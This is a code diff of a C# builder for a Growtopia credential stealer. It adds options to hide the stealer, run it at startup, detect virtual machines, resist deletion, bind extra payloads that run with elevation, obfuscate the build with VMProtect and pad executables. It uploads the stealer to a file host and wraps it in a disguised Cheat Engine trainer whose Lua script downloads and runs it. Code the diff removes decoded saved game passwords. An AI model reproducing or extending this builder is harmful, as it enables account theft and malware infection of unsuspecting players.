@@ -1,15 +1,16 @@
 ﻿using System;
-using System.CodeDom.Compiler;
+using System.IO;
+using System.Configuration;
+using System.Text.RegularExpressions;
 using System.Collections.Generic;
 using System.ComponentModel;
-using System.Configuration;
-using System.Diagnostics;
-using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Text;
-using System.Text.RegularExpressions;
 using System.Windows.Forms;
+using System.CodeDom.Compiler;
+using AnonFileAPI;
+using System.IO.Compression;
+using System.Diagnostics;
 
 namespace Z_Builder
 {
@@ -17,12 +18,18 @@ namespace Z_Builder
     {
         List <string> alldata { get; set; }
         string IcoFilePath { get; set; }
-        public Form2()
+        public Form2(string ID)
         {
             InitializeComponent();
+            metroTextBox8.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/EjyNVk6f");
+            metroTextBox9.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/d8LcaGtW");
+            metroTextBox10.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/eXJtr8TR");
+            metroCheckBox3.Enabled = false;
             metroTextBox6.Visible = false;
-            metroTextBox4.Text = ConfigurationManager.AppSettings["savefolderpath"];
-            string savefolderpath = metroTextBox4.Text;
+            metroLabel6.Text = ID;
+            metroTextBox4.Text = ConfigurationManager.AppSettings["zbfolderpath"];
+            string zbfolderpath = metroTextBox4.Text;
+            try { Directory.CreateDirectory(@"C:\Temp"); } catch { }
         }
         #region Decoder
         private void metroButton1_Click(object sender, EventArgs e)
@@ -35,7 +42,7 @@ namespace Z_Builder
                 string savefolderpath = folderDlg.SelectedPath;
                 metroTextBox4.Clear();
                 metroTextBox4.AppendText(savefolderpath);
-                Program.setSetting("savefolderpath", metroTextBox4.Text);
+                Program.setSetting("zbfolderpath", metroTextBox4.Text);
             }
         }
 
@@ -43,233 +50,27 @@ namespace Z_Builder
         {
 
         }
-        private void listBox1_SelectedIndexChanged_1(object sender, EventArgs e)
-        {
-            metroTextBox1.Clear();
-            metroTextBox2.Clear();
-            metroTextBox3.Clear();
-            try
-            {
-                string curGrowID = listBox1.SelectedItem.ToString();
-                metroTextBox1.Text = curGrowID;
-                string rawresult = alldata.FirstOrDefault(alldata => alldata.Contains(curGrowID));
-                string[] result = rawresult.Split(new[] { "[This-Is-A-Split]" }, StringSplitOptions.RemoveEmptyEntries);
-                metroTextBox2.Text = result[1];
-                string rawpasswords = result[2];
-                string[] passwords = rawpasswords.Split(new[] { "[#---Zephyr---#]" }, StringSplitOptions.RemoveEmptyEntries);
-                foreach (string i in passwords)
-                {
-                    if (i != "")
-                    {
-                        metroTextBox3.AppendText(i);
-                        metroTextBox3.AppendText(Environment.NewLine);
-                    }
-                }
-            }
-            catch
-            {
-            }
-        }
+        
         private void metroButton2_Click(object sender, EventArgs e)
         {
-            alldata = DecodeDats();
+            SortZB();
         }
-        public List<string> DecodeDats()
+        void SortZB()
         {
-            try
+            string zbfolderpath = ConfigurationManager.AppSettings["zbfolderpath"];
+            string[] allsaves = Directory.GetFiles(zbfolderpath, "*.zb");
+            string RawData = "";
+            listView2.Items.Clear();
+            foreach (string i in allsaves)
             {
-                List<string> alldata = new List<string>();
-                listBox1.Items.Clear();
-                string savefolderpath = ConfigurationManager.AppSettings["savefolderpath"];
-                string[] allsaves = Directory.GetFiles(savefolderpath, "*.dat");
-                var pattern = new Regex(@"[^\w0-9]");
-                foreach (string i in allsaves)
-                {
-                    string savedata = null;
-                    var r = File.Open(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
-                    using (FileStream fileStream = new FileStream(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                    {
-                        using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
-                        {
-                            savedata = streamReader.ReadToEnd();
-                        }
-                    }
-                    string cleardata = savedata.Replace("\u0000", " ");
-                    string GrowID = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
-                    listBox1.Items.Add(GrowID);
-                    string LastWorld = pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
-                    if (LastWorld == "fullscreen")
-                    {
-                        LastWorld = null;
-                    }
-                    string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
-                    string allpw = "";
-                    foreach (string pw in passwords)
-                    {
-                        allpw += pw + "[#---Zephyr---#]";
-                    }
-                    string accdata = GrowID + "[This-Is-A-Split]" + LastWorld + "[This-Is-A-Split]" + allpw;
-                    alldata.Add(accdata);
-                }
-                return alldata;
+                RawData += File.ReadAllText(i);
             }
-            catch
+            string[] SplittedData = RawData.Split('\n');
+            foreach(string i in SplittedData)
             {
-                return null;
-            }
-        }
-        
-        public class PasswordDec
-        {
-            public List<string> PPW(byte[] contents)
-            {
-                List<string> result;
-                try
-                {
-                    string text = "";
-                    for (int i = 0; i < contents.Length; i += 1)
-                    {
-                        byte b = contents[i];
-                        string text2 = b.ToString("X2");
-                        bool flag = text2 == "00";
-                        if (flag)
-                        {
-                            text += "<>";
-                        }
-                        else
-                        {
-                            text += text2;
-                        }
-                    }
-                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
-                    if (flag2)
-                    {
-                        string text3 = "74616E6B69645F70617373776F7264";
-                        int num = text.IndexOf(text3);
-                        int num2 = text.LastIndexOf(text3);
-                        bool flag3 = false;
-                        string text4;
-                        if (flag3)
-                        {
-                            text4 = string.Empty;
-                        }
-                        num += text3.Length;
-                        int num3 = text.IndexOf("<><><>", num);
-                        bool flag4 = false;
-                        if (flag4)
-                        {
-                            text4 = string.Empty;
-                        }
-
-                        string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
-                        bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
-                        if (flag5)
-                        {
-                            text4 = text.Substring(num, num3 - num).Trim();
-                        }
-                        else
-                        {
-                            num2 += text3.Length;
-                            num3 = text.IndexOf("<><><>", num2);
-                            text4 = text.Substring(num2, num3 - num2).Trim();
-                        }
-                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
-                        int num4 = text.IndexOf(text5);
-                        bool flag6 = false;
-                        string text6;
-                        if (flag6)
-                        {
-                            text6 = string.Empty;
-                        }
-                        num4 += text5.Length;
-                        int num5 = text.IndexOf("<><><>", num4);
-                        bool flag7 = false;
-                        if (flag7)
-                        {
-                            text6 = string.Empty;
-                        }
-
-                        text6 = text.Substring(num4, num5 - num4).Trim();
-                        int num6 = StringToByteArray(text4)[0];
-                        text6 = text6.Substring(0, num6 * 2);
-                        byte[] array = StringToByteArray(text6.Replace("<>", "00"));
-                        List<byte> list = new List<byte>();
-                        List<byte> list2 = new List<byte>();
-                        byte b2 = (byte)(48 - array[0]);
-                        byte[] array2 = array;
-                        for (int j = 0; j < array2.Length; j += 1)
-                        {
-                            byte b3 = array2[j];
-                            list.Add((byte)(b2 + b3));
-                        }
-                        for (int k = 0; k < list.Count; k += 1)
-                        {
-                            list2.Add((byte)(list[k] - 1 - k));
-                        }
-                        List<string> list3 = new List<string>();
-                        int num7 = 0;
-                        while ((num7 > 255 ? 1 : 0) == 0)
-                        {
-                            string text7 = "";
-                            foreach (byte b4 in list2)
-                            {
-                                bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
-                                if (flag8)
-                                {
-                                    text7 += ((char)((byte)((int)b4 + num7))).ToString();
-                                }
-                            }
-                            bool flag9 = text7.Length == num6;
-                            if (flag9)
-                            {
-                                list3.Add(text7);
-                            }
-                            num7 += 1;
-                        }
-                        result = list3;
-                    }
-                    else
-                    {
-                        result = null;
-                    }
-                }
-                catch
-                {
-                    result = null;
-                }
-                return result;
-            }
-            public byte[] StringToByteArray(string str)
-            {
-                Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
-                for (int i = 0; i <= 255; i++)
-                    hexindex.Add(i.ToString("X2"), (byte)i);
-
-                List<byte> hexres = new List<byte>();
-                for (int i = 0; i < str.Length; i += 2)
-                    hexres.Add(hexindex[str.Substring(i, 2)]);
-
-                return hexres.ToArray();
-            }
-            private bool ValidateChar(char cdzdshr)
-            {
-                if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
-                        (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
-                        (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
-                        (cdzdshr >= 0x2B && cdzdshr <= 0x2E) ||
-                        (cdzdshr >= 0x21 && cdzdshr <= 0x29) ||
-                        (cdzdshr >= 0x2A && cdzdshr <= 0x2F) ||
-                        (cdzdshr >= 0x3A && cdzdshr <= 0x40) ||
-                        (cdzdshr >= 0x5B && cdzdshr <= 0x60) ||
-                        (cdzdshr >= 0x7B && cdzdshr <= 0x7E)) return true;
-                else return false;
-            }
-
-            public string[] Func(byte[] lel)
-            {
-                byte[] buff = lel;
-                var passwords = PPW(buff);
-                return passwords.ToArray();
+                string[] CleanedData = i.Split(new[] { "[---ZB-Split---]" }, StringSplitOptions.RemoveEmptyEntries);
+                ListViewItem CleanedAccData = new ListViewItem(CleanedData);
+                listView2.Items.Add(CleanedAccData);
             }
         }
         #endregion
@@ -302,12 +103,26 @@ namespace Z_Builder
         {
             if (!String.IsNullOrEmpty(metroTextBox5.Text))
                 {
-                SaveFileDialog sfd = new SaveFileDialog();
-                sfd.FileName = "Stealer.exe";
-                sfd.Filter = "Exe files (*.exe)|*.exe";
-                if (sfd.ShowDialog() == DialogResult.OK)
+                if (metroCheckBox8.Checked == true)
                 {
-                    compile(sfd.FileName);
+                    SaveFileDialog sfd = new SaveFileDialog();
+                    sfd.FileName = "Stealer.CETRAINER";
+                    sfd.Filter = "CETRAINER files (*.CETRAINER)|*.CETRAINER";
+                    if (sfd.ShowDialog() == DialogResult.OK)
+                    {
+                        sfd.FileName = Path.GetDirectoryName(sfd.FileName) + "\\" + Path.GetFileNameWithoutExtension(sfd.FileName) + ".exe";
+                        compile(sfd.FileName);
+                    }
+                }
+                else
+                {
+                    SaveFileDialog sfd = new SaveFileDialog();
+                    sfd.FileName = "Stealer.exe";
+                    sfd.Filter = "Exe files (*.exe)|*.exe";
+                    if (sfd.ShowDialog() == DialogResult.OK)
+                    {
+                        compile(sfd.FileName);
+                    }
                 }
             }
             else
@@ -317,6 +132,14 @@ namespace Z_Builder
         }
         public void compile(string path)
         {
+            if (listView1.Items.Count > 0)
+            {
+                if(metroComboBox1.Text == "")
+                {
+                    MessageBox.Show("Drop path required for binded files");
+                    return;
+                }
+            }
             string basecode = Properties.Resources.Code;
             basecode = BuildBase(basecode);
             List<string> code = new List<string>();
@@ -352,10 +175,14 @@ namespace Z_Builder
             compars.ReferencedAssemblies.Add("System.Core.dll");
             compars.ReferencedAssemblies.Add("System.Security.dll");
             compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
-            string ospath = Path.GetPathRoot(Environment.SystemDirectory);
-            string tempPath = ospath + "Temp";
+            string tempPathForAntiDelete = @"C:\Temp\AntiDelete.exe";
+            try { File.Delete(tempPathForAntiDelete); } catch { }
+            File.WriteAllBytes(tempPathForAntiDelete, Properties.Resources.AntiDelete);
+            compars.EmbeddedResources.Add(tempPathForAntiDelete);
             compars.GenerateExecutable = true;
-            compars.OutputAssembly = path;
+            string TempEXEPath = @"C:\Temp\" + Path.GetFileName(path);
+            try { File.Delete(TempEXEPath); } catch { }
+            compars.OutputAssembly = TempEXEPath;
             compars.GenerateInMemory = false;
             compars.TreatWarningsAsErrors = false;
             compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
@@ -365,7 +192,13 @@ namespace Z_Builder
             }
             else if (string.IsNullOrEmpty(metroTextBox7.Text) || string.IsNullOrWhiteSpace(metroTextBox7.Text))
             {
-
+            }
+            if (listView1.Items.Count > 0)
+            {
+                foreach (ListViewItem item in listView1.Items)
+                {
+                    compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
+                }
             }
             System.Threading.Thread.Sleep(100);
             CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
@@ -388,7 +221,35 @@ namespace Z_Builder
                     File.Delete(Application.StartupPath + @"\manifest.manifest");
                 }
                 catch { }
-                MessageBox.Show("Stealer compiled!");
+				//Auto Obfuscation
+                Process p = new Process();
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.WorkingDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
+                p.StartInfo.Arguments = "/C VMProtect_Con " + TempEXEPath + " " + path;
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.Start();
+                p.WaitForExit();
+                //Auto Obfuscation End
+                File.Delete(TempEXEPath);
+                if (metroCheckBox8.Checked == true)
+                {
+                    using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
+                    {
+                        AnonFile anonFile = anonFileWrapper.UploadFile(path);
+                        string DownloadPath = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl);
+                        string CetrainerCode = "function lolokieZ(boops)local beepboop = (5*3-2/8+9*2/9+8*3) end function lolokieZ(blahblah)local beepboop = (5*3-2/8+9*2/9+8*3) end local beepboop = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont.exe')";
+                        string path2 = Path.GetDirectoryName(path) + "\\" + Path.GetFileNameWithoutExtension(path) + ".CETRAINER";
+                        File.WriteAllText(path2, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + CetrainerCode + "\n</LuaScript>\n</CheatTable>");
+                    }
+                    File.Delete(path);
+                    File.Delete(tempPathForAntiDelete);
+                    MessageBox.Show("Stealer compiled!");
+                }
+                else
+                {
+                    File.Delete(tempPathForAntiDelete);
+                    MessageBox.Show("Stealer compiled!");
+                }
             }
         }
         public string BuildBase(string code)
@@ -397,29 +258,91 @@ namespace Z_Builder
             //Webhook
             building = building.Replace("webhook_url", metroTextBox5.Text);
             //Fake error message
-            if ((metroCheckBox4.Checked) && (!String.IsNullOrEmpty(metroTextBox6.Text)))
+            if ((metroCheckBox4.Checked == true) && (!String.IsNullOrEmpty(metroTextBox6.Text)))
             {
                 building = building.Replace("//FakeErrorMessage", "MessageBox.Show("+ '"' + metroTextBox6.Text + '"' +  "," + "\"Error!\"" + ",MessageBoxButtons.OK);");
             }
             //Hide stealer
-            if (metroCheckBox2.Checked)
+            if (metroCheckBox2.Checked == true)
             {
                 building = building.Replace("//HideStealer", "try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
             }
             //Trace save.dat
-            if (metroCheckBox1.Checked)
+            if (metroCheckBox1.Checked == true)
             {
                 building = building.Replace("//Tracer","Tracer.TraceSave();");
             }
             //Delete Growtopia
-            if (metroCheckBox5.Checked)
+            if (metroCheckBox5.Checked == true)
             {
                 building = building.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
             }
             //Run on startup
-            if (metroCheckBox6.Checked)
+            if (metroCheckBox6.Checked == true)
             {
-                building = building.Replace("//RunOnStartup", "RunOnStartup();");
+                building = building.Replace("//RunOnStartup","RunOnStartup();");
+            }
+            //Anti-Delete
+            if (metroCheckBox3.Checked  == true)
+            {
+                building = building.Replace("//AntiDelete", "AntiDeleteStealer();");
+                building = building.Replace(@"//[AntiDelete]", "");
+            }
+            //Locate all save.dats
+            if (metroCheckBox7.Checked == true && metroCheckBox7.Enabled == true)
+            {
+                building = building.Replace("//LocateAllSaveDats", "LocateAllSaveDats();");
+            }
+            //Anti-VM
+            if (metroCheckBox9.Checked == true)
+            {
+                building = building.Replace("//AntiVM", "AntiVM();");
+                building = building.Replace("//[AntiVM]", "");
+            }
+            //Recover save.dats
+            if (metroCheckBox10.Checked == true && metroCheckBox10.Enabled == true)
+            {
+                building = building.Replace("//RecoverSaveDats", "RecoverSaveDats2();");
+            }
+            if (listView1.Items.Count > 0)
+            {
+                string extractcode = @"		static void ugaylmao()
+		{
+			string copytothis = Environment.ExpandEnvironmentVariables(""**PATHRESOURCE**"");
+			//turnon
+		}
+		private static void Extract(string resource, string path, bool admin)
+		{
+			using (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
+			{
+				using (var fileStream = new FileStream(path + ""\\"" + resource, FileMode.Create, FileAccess.Write))
+				{
+					assemblystream.CopyTo(fileStream);
+                    fileStream.Close();
+				}
+			}
+			if (admin)
+			{
+                    Process process = new Process();
+                    process.StartInfo.FileName = path + ""\\"" + resource;
+                    process.StartInfo.UseShellExecute = true;
+                    process.StartInfo.Verb = ""runas"";
+                    process.Start();
+            }
+			else
+			{
+				Process.Start(path + ""\\"" + resource);
+			}
+		}";
+                int index = extractcode.IndexOf("//turnon");
+                string cd = extractcode;
+                foreach (ListViewItem items in listView1.Items)
+                {
+                    cd = cd.Insert(index, Environment.NewLine + @"Extract(""" + Path.GetFileName(items.SubItems[0].Text) + @""", copytothis," + items.SubItems[1].Text + ")" + ";");
+                }
+                building = building.Replace("//extractbinder", cd);
+                building = building.Replace("**PATHRESOURCE**", metroComboBox1.SelectedItem.ToString());
+                building = building.Replace("//turnonbinder", "ugaylmao();");
             }
             return building;
         }
@@ -432,6 +355,157 @@ namespace Z_Builder
             else
             {
                 metroTextBox6.Visible = false;
+            }
+        }
+
+        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            if (metroCheckBox1.Checked == true)
+            {
+                metroCheckBox3.Enabled = true;
+            }
+            else
+            {
+                metroCheckBox3.Enabled = false;
+            }
+        }
+
+        private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
+        {
+            if (metroCheckBox10.Checked == true)
+            {
+                metroCheckBox7.Enabled = false;
+            }
+            else
+            {
+                metroCheckBox7.Enabled = true;
+            }
+        }
+
+        private void metroCheckBox7_CheckedChanged(object sender, EventArgs e)
+        {
+            if (metroCheckBox7.Checked == true)
+            {
+                metroCheckBox10.Enabled = false;
+            }
+            else
+            {
+                metroCheckBox10.Enabled = true;
+            }
+        }
+        #endregion
+        #region Binder
+        private void metroButton5_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                string[] BindedFileInfo = { ofd.FileName, "false" };
+                ListViewItem BindedList = new ListViewItem(BindedFileInfo);
+                listView1.Items.Add(BindedList);
+            }
+            else
+            {
+                return;
+            }
+        }
+        private void metroButton7_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems[0].SubItems[1].Text == "true")
+                {
+                    listView1.SelectedItems[0].SubItems[1].Text = "false";
+                }
+                else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
+                {
+                    listView1.SelectedItems[0].SubItems[1].Text = "true";
+                }
+            }
+            catch { }
+        }
+        private void metroButton6_Click(object sender, EventArgs e)
+        {
+            if (listView1.Items.Count > 0)
+            {
+                try
+                {
+                    listView1.SelectedItems[0].Remove();
+                }
+                catch { }
+            }
+        }
+        #endregion
+        #region Pumper
+        private void metroButton9_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                metroTextBox11.Text = ofd.FileName;
+            }
+        }
+        private void metroCheckBox11_CheckedChanged(object sender, EventArgs e)
+        {
+            if (metroCheckBox11.Checked == true)
+            {
+                metroCheckBox12.Checked = false;
+            }
+            else
+            {
+                metroCheckBox12.Checked = true;
+            }
+        }
+        private void metroCheckBox12_CheckedChanged(object sender, EventArgs e)
+        {
+            if (metroCheckBox12.Checked == true)
+            {
+                metroCheckBox11.Checked = false;
+            }
+            else
+            {
+                metroCheckBox11.Checked = true;
+            }
+        }
+        private void metroButton8_Click(object sender, EventArgs e)
+        {
+            if (File.Exists(metroTextBox11.Text)&&Path.GetExtension(metroTextBox11.Text)==".exe")
+            {
+                if (metroCheckBox11.Checked == true)
+                {
+                    FileStream file = File.OpenWrite(metroTextBox11.Text);
+                    long ende = file.Seek(0, SeekOrigin.End);
+                    decimal groesse = numericUpDown1.Value * 1048;
+                    while (ende < groesse)
+                    {
+                        ende++;
+                        file.WriteByte(0);
+                    }
+                    file.Close();
+                    MessageBox.Show("Exe file pumped!");
+                }
+                else if (metroCheckBox12.Checked == true)
+                {
+                    FileStream file = File.OpenWrite(metroTextBox11.Text);
+                    long ende = file.Seek(0, SeekOrigin.End);
+                    decimal groesse = numericUpDown1.Value * 1048576;
+                    while (ende < groesse)
+                    {
+                        ende++;
+                        file.WriteByte(0);
+                    }
+                    file.Close();
+                    MessageBox.Show("Exe file pumped!");
+                }
+                else
+                {
+                    MessageBox.Show("Select KB or MB");
+                }
+            }
+            else
+            {
+                MessageBox.Show("Bad File or no executable path chosen!");
             }
         }
         #endregion
